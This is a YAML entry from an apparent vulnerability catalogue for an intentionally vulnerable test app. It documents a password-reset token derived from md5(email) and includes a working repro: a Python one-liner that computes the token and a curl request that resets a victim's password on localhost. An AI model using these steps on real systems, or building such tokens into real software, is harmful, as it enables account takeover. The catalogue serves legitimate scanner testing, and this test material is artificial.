  - id: AUTH-RESET-001
    title: Predictable password-reset token enables account takeover
    class: PredictableToken
    cwe: CWE-330
    owasp: "A02:2021"
    tier: 1
    origin: api
    endpoint: "POST /api/auth/reset/confirm"
    severity: Critical
    auth: none
    detector: diver_weak_token
    gating: VF_HARDENED
    deterministic: true
    secured_twin: AUTH-RESET-001-SAFE
    intentional: true
    repro: |
      # The reset token is md5(email). Attacker resets a victim by guessing it:
      python -c "import hashlib;print(hashlib.md5(b'bob@globex.test').hexdigest())"
      curl -X POST http://localhost:8081/api/auth/reset/confirm \
        -H "Content-Type: application/json" \
        -d '{"email":"bob@globex.test","token":"<md5>","newPassword":"Pwned1!"}'
      # -> 200; victim's password is now the attacker's.

